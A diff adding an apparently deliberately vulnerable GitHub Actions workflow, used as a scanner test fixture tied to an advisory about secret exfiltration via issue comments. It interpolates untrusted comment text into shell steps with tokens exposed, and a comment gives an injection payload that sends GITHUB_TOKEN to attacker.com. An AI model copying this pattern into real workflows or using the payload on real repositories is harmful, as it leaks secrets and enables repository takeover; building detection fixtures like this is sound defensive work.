@@ -1,0 +1,43 @@
+# GHSA-phf6-hm3h-x8qp: Secret exfiltration via issue_comment trigger
+# Advisory: https://github.com/advisories/GHSA-phf6-hm3h-x8qp
+# Vulnerability: Command injection in issue_comment allows GITHUB_TOKEN exfiltration
+# Expected detection: CodeInjectionCriticalRule, SecretExfiltrationRule
+# Severity: Critical (CVSS 9.1)
+# CWE: CWE-78 (OS Command Injection)
+# Package: broadinstitute/cromwell
+
+name: Vulnerable ScalaFmt Fix
+
+on:
+  issue_comment:
+    types: [created]
+
+permissions:
+  actions: write
+  contents: write
+  deployments: write
+  issues: write
+  pull-requests: write
+
+jobs:
+  scalafmt:
+    if: github.event.issue.pull_request
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check for ScalaFmt Comment
+        run: |
+          # Vulnerable: Direct interpolation of untrusted input
+          # Attacker can inject: "; curl https://attacker.com?token=$GITHUB_TOKEN; echo "
+          if [[ "${{ github.event.comment.body }}" == *"scalafmt"* ]]; then
+            echo "Running scalafmt"
+          fi
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          BROADBOT_TOKEN: ${{ secrets.BROADBOT_GITHUB_TOKEN }}
+
+      - name: Apply ScalaFmt
+        if: contains(github.event.comment.body, 'scalafmt')
+        run: |
+          # Additional vulnerable pattern with secrets exposed
+          echo "Processing: ${{ github.event.comment.body }}"
+          # Secret exfiltration risk with exposed tokens
